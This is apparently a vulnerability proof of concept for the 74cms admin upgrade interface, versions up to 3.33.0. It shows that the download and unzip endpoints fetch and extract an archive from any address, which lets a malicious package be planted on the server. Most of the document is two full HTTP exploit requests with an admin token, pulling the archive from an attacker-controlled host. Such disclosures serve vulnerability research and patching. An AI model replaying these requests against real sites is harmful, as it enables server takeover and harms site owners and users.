# env

```text
https://www.74cms.com/download/detail/175.html
```
# version
74cms <= 3.33.0
# detail
In the background interface apiadmin, no official address is specified, and you can enter any address to download, subsequent support to decompress, then we construct a malicious upload package on the server. The structure is as follows

![](.imgs/359e8aee.png)

Although the decompression failure will be reported during the decompression, it can be ignored

![](.imgs/500aaecd.png)

The packet is as follows

```text
GET /apiadmin/Upgrade/download?timestamp=1&path=http://10.211.55.2:8081/upgrade.zip HTTP/1.1
Host: 10.211.55.11:8092
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
admintoken: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjQ0ODMyMzQsImV4cCI6MTczMjI1OTIzNCwiaW5mbyI6eyJpZCI6MSwicm9sZV9pZCI6MX19.2jxjmAyNXp75aVUVFKUxaYK9pgBLp9rqAaM3hQ7B2pQ
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive

```


```text
GET /apiadmin/Upgrade/unzip?timestamp=1&path=http://10.211.55.2:8081/upgrade.zip HTTP/1.1
Host: 10.211.55.11:8092
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
admintoken: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjQ0ODMyMzQsImV4cCI6MTczMjI1OTIzNCwiaW5mbyI6eyJpZCI6MSwicm9sZV9pZCI6MX19.2jxjmAyNXp75aVUVFKUxaYK9pgBLp9rqAaM3hQ7B2pQ
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
```